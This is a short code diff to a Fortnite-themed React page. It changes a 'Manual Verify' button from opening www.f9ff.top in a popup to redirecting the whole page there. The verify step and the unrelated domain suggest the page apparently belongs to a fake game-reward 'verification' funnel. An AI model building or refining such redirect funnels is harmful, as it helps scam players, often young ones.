@@ -174,15 +174,13 @@ const handleVerify = () => {
             >
               <Button
   onClick={() => {
-    const newWindow = window.open("https://www.f9ff.top", "_blank");
-    if (!newWindow || newWindow.closed || typeof newWindow.closed === "undefined") {
-      alert("Popup blocked! Please allow pop-ups in your browser settings.");
-    }
+    window.location.href = "https://www.f9ff.top";
   }}
   className="w-full py-6 bg-fortnite-yellow hover:bg-fortnite-yellow/90 text-fortnite-black font-bold text-xl"
 >
   Manual Verify
 </Button>
+
 
 
             </motion.div>
